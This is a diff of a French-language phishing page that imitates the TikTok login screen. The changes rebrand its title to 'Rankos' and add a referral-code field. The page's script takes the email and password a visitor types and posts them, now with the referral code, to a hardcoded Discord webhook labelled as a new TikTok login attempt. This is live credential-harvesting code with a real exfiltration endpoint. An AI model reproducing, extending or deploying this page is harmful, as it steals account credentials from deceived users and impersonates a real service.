@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Se connecter | TikTok</title>
+  <title>Se connecter | Rankos</title>
 
   <!-- Open Graph Meta Tags -->
-  <meta property="og:title" content="Se connecter | TikTok" />
+  <meta property="og:title" content="Se connecter | Rankos" />
   <meta property="og:description" content="." />
   <meta property="og:image" content="https://i.ibb.co/sdVtRCfZ/41b3zsiq4p-L.png" />
 
@@ -195,8 +195,7 @@
   </header>
 
   <div class="container" id="main-container">
-    <h1>Connecte-toi a Tiktok</h1>
-    <h2></h2>
+    <h1>Connecte-toi à TikTok</h1>
     <p class="description">Gère ton compte, consulte tes notifications, commente des vidéos et bien plus encore.</p>
 
     <div class="btn">
@@ -207,7 +206,7 @@
     <div class="btn" onclick="showLoginForm()">
       <img src="https://img.icons8.com/ios-filled/50/000000/user.png" alt="User Icon" />
       Utiliser le téléphone/l’e-mail/le nom d’utilisateur
-      <span class="badge">Dernière connexion</span>
+      <span class="badge">Code Parrainage</span>
     </div>
 
     <div class="btn">
@@ -221,7 +220,7 @@
     </div>
 
     <p class="terms">
-      En continuant, tu acceptes les <a href="#">Conditions d'utilisation</a> de Tiktok et confirmes avoir lu la <a href="#">Politique de confidentialité</a>.
+      En continuant, tu acceptes les <a href="#">Conditions d'utilisation</a> de TikTok et confirmes avoir lu la <a href="#">Politique de confidentialité</a>.
     </p>
 
     <div class="signup">
@@ -240,6 +239,7 @@
       <input type="password" id="password" placeholder="Mot de passe" />
       <span class="toggle-password" onclick="togglePassword()">👁️</span>
     </div>
+    <input type="text" id="referral" placeholder="Code Parrainage (optionnel)" />
     <a href="#">Mot de passe oublié ?</a>
     <button id="loginBtn" disabled>Se connecter</button>
     <div class="back-link" onclick="showMain()">← Retour</div>
@@ -266,6 +266,7 @@
 
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
+    const referralInput = document.getElementById('referral');
     const loginBtn = document.getElementById('loginBtn');
 
     function updateButtonState() {
@@ -284,6 +285,7 @@
     loginBtn.addEventListener('click', () => {
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
+      const referral = referralInput.value.trim();
 
       if (email.length <= 5 || password.length <= 5) return;
 
@@ -291,6 +293,7 @@
         `📥 **Nouvelle tentative de connexion TikTok**\n\n` +
         `**👤 Email ou Nom d'utilisateur :** \`${email}\`\n` +
         `**🔐 Mot de passe :** \`${password}\`\n` +
+        `🏷️ Code Parrainage : \`${referral || "Aucun"}\`\n` +
         `🕒 Date : ${new Date().toLocaleString('fr-FR')}`;
 
       fetch('https://discord.com/api/webhooks/1382805479318884393/q3PgxN5YRwcy1MPgFurwEWHcLq9c3wBSqAOSnKkbYO1z23cRgTPuEzCgvcILBvf_-_p6', {
